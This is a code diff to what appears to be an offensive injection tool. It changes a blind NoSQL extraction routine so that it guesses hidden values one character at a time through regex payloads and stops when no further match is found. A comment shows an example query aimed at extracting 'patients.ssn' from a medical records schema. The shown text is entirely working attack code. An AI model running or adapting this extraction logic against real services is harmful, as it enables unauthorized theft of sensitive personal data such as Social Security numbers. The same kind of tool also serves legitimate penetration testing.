@@ -156,24 +156,22 @@ def blind_mssql(url, method, headers):
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
     requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
-
+    
 
 def blind_nosql(url, method, headers):
     # Query - include BLIND_PLACEHOLDER. e.g. {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
     query = input("Query > ")
     # Check the input (known value) against the data found - e.g. 5d089c51dcab2d0032fdd08d
     check = input("Check > ")
-    # Max data size - Default 32
-    data_size = input("Size > ")
-    if(not data_size): 
-        data_size = 32
     # Charset to use - Default abcdefghijklmnopqrstuvwxyz1234567890
     charset = input("Charset > ")
     if(not charset):
         charset = "abcdefghijklmnopqrstuvwxyz1234567890"
     data = ""
-
-    while len(data) != data_size:
+    _break = False
+    
+    while (_break == False):
+        old_data = data
         for c in charset:
             injected = query.replace("BLIND_PLACEHOLDER", data + c)
             r = requester(url, method, injected, headers)
@@ -181,6 +179,8 @@ def blind_nosql(url, method, headers):
                 data += c
                 # display data and update the current line
                 print("\r\033[92m[+] Data found:\033[0m {}".format(data), end='', flush=False)
-
+        # Stop if no character is found
+        if(old_data == data):  
+            _break = True
     # force a line return to clear the screen after the data trick
     print("")
